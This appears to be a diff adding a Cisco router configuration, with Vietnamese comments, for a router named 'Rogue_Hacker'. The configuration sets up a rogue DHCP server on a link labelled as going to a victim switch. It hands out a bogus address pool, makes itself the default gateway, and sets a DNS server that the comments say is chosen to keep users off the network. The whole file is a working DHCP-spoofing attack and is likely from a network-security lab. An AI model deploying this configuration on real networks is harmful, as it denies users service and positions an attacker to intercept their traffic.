@@ -1,0 +1,20 @@
+enable
+configure terminal
+hostname Rogue_Hacker
+
+! 1. Cấu hình cổng nối xuống Switch với IP lạ
+interface g0/0
+ description LINK_TO_VICTIM_SWITCH
+ ip address 172.16.0.1 255.255.255.0
+ no shutdown
+exit
+
+! 2. Cấu hình DHCP Server giả mạo (Cấp dải IP sai lệch)
+ip dhcp pool FAKE_POOL
+ network 172.16.0.0 255.255.255.0
+ default-router 172.16.0.1
+ dns-server 1.1.1.1
+! (Cố tình cấp DNS sai để người dùng không vào được mạng)
+exit
+
+end
